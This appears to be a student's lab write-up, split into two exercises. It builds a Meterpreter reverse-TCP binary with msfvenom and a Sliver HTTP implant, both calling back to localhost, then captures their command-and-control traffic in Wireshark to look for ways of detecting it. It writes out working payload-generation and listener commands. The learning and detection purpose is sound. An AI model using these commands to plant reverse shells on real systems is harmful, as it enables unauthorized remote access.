# A) Sniff venom
At first I made malicious binaries with msfvenom. I used the following command: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o infected1`  
After the malicious binary was made, i opened multi/handler in msfconsole, and set the LHOST, LPORT and the payload to be the same as the attack payload.  
Then i started up the ran the malicious binary and got a connection to multi/handler.

Now that the connection has been made, i opened wireshark and gave a few random commands in the meterpreter session to see what the traffic looks like

This was the traffic of a single `ls` command. Im not sure how to analyze this. Maybe this can be detected by unusual TCP port?  
# B) Hello, Sliver.  
I started out by downloading sliver: `sudo apt-get install sliver`  
After that I ran sliver: `sliver-server`  
Then I generated a malicious payload for linux and set the callback address as loopback: `generate --http 127.0.0.1 --os linux`

After that I started the http listener with the command `http`, and ran the payload.

To interact with the session, I used the command `sessions -i sessionID`

I tried to analyze the traffic once again with wireshark, but I cannot pinpoint anything suspicious about the traffic, maybe once again a weird portnumber?
